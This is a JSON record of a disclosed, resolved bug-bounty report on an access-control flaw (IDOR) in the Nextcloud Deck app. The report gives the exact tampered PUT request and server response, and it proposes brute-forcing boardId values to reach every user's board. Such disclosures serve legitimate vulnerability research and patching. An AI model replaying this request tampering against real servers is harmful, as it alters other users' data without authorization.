{
  "id": 1450117,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDUwMTE3",
  "url": "https://hackerone.com/reports/1450117",
  "title": "Nextcloud Deck : Possibility for anyone to add a stack with existing tasks on anyone's board",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-01-14T23:58:19.947Z",
  "submitted_at": "2022-01-14T23:58:20.041Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "supr4s",
    "url": "/supr4s",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/cnms4l7faunf0sht0ox61ouwsqlj/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13291,
    "url": "https://hackerone.com/nextcloud",
    "handle": "nextcloud",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Nextcloud",
      "twitter_handle": "nextclouders",
      "website": "https://nextcloud.com",
      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-29159"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-05-20T10:37:23.448Z",
  "bug_reporter_agreed_on_going_public_at": "2022-05-20T10:37:23.381Z",
  "team_member_agreed_on_going_public_at": "2022-05-20T08:08:29.587Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi everyone,\n\nHope you are well ! \n\nI found an IDOR vulnerability, allowing any user without privilege to add lists with tasks in any user board.\nThis was tested on a Nextcloud Hub II server (v23) with the Deck application in version 1.6.0.\n\n## Steps To Reproduce:\n\nBeforehand: \n\n- Have an A user with a board ID specific to that user (`boardId` parameter)\n- Have a user B with a board ID specific to that user (`boardId` parameter)\n- Note that there is no link between our user A and user B\n\n**1°)** With your user A, rename an existing list belonging to him. \n\nThe following PUT request is made :\n\n```\nPUT /apps/deck/stacks/31 HTTP/1.1\nHost: nextcloud.yourserver.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0\nAccept: application/json, text/plain, */*\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nrequesttoken: <token>\nContent-Length: 136\nOrigin: https://nextcloud.yourserver.com\nConnection: close\nCookie: <your_session_cookies>\n\n{\"title\":\"IDOR\",\"boardId\":14,\"deletedAt\":0,\"lastModified\":1642201857,\"order\":0,\"id\":31,\"ETag\":\"a5f7e3ab477ee2a2259f0889a63130a8\"} \n```\n\nIntercept the request, change the `boardId` parameter to that of your victim (user B)  and play the modified request..\n\nCheck the server response that confirms the vulnerability: \n\n```\nHTTP/1.1 200 OK\nServer: nginx\nDate: Fri, 14 Jan 2022 23:39:49 GMT\nContent-Type: application/json; charset=utf-8\nContent-Length: 135\nConnection: close\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nPragma: no-cache\nCache-Control: no-cache, no-store, must-revalidate\nContent-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'\nFeature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'\nX-Robots-Tag: none\nReferrer-Policy: no-referrer\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Robots-Tag: none\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nStrict-Transport-Security: max-age=31536000; includeSubDomains;\n\n{\"title\":\"IDOR_REPORT\",\"boardId\":1,\"deletedAt\":0,\"lastModified\":1642201857,\"order\":0,\"id\":31,\"ETag\":\"a5f7e3ab477ee2a2259f0889a63130a8\"}\n```\n\n**2°)** With your user B, go to the board in question and notice the addition of a new list with tasks without his knowledge\n\nAdditional Notes: \n\n- This works from one user without privilege to another\n- It works from an unprivileged user on the board of an administrator/privileged user\n- If this vulnerability is exploited with a list containing several tasks, each containing images, labels, calendar etc., everything is imported to the victim's account\n- If our victim deletes the list created without his knowledge, it also deletes it on the attacker's side\n\n## Impact\n\nBroken Access Control - IDOR : The impact here is to be able to add lists with tasks on the board of any user and harm them.\nWe could imagine here brute-forcing the `boardId` parameter starting from 1 to 1000 (for example) to exploit this vulnerability on all the existing users/tables. We could also create on our victim an incalculable number of lists on his board.\n\nLooking forward to exchanging.\n\nRegards,\nSupras",
  "weakness": {
    "id": 55,
    "name": "Insecure Direct Object Reference (IDOR)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-06-19T08:08:29.738Z",
  "allow_singular_disclosure_after": -102785418.047193,
  "singular_disclosure_allowed": true,
  "vote_count": 11,
  "voters": [
    "zy9ard3",
    "shreyaschavhan",
    "thalaivar304",
    "h4x0r_dz",
    "shivammusic",
    "r4sh7n_",
    "smilekilerguy",
    "destinedtohack",
    "meispi",
    "0xkenzo",
    "and 1 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.0,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "none",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 72103,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "nextcloud/deck",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 148194,
      "category": "team",
      "content": "Advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-vqhf-673w-7r3j",
      "updated_at": "2022-05-02T08:54:56.785Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 89223,
        "username": "nickvergessen",
        "name": "Joas Schilling",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "Germany",
        "created_at": "2016-07-01T08:17:59.061Z",
        "url": "https://hackerone.com/nickvergessen",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6ODQyMTQ5LCJwdXIiOiJibG9iX2lkIn19--7544c99c2f87f134b16d5b20f81dbc06444df8d8/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c155082ce6f9751dcb29cd6ea061a7e4d7329577/2019_cfhn1.png"
        }
      }
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
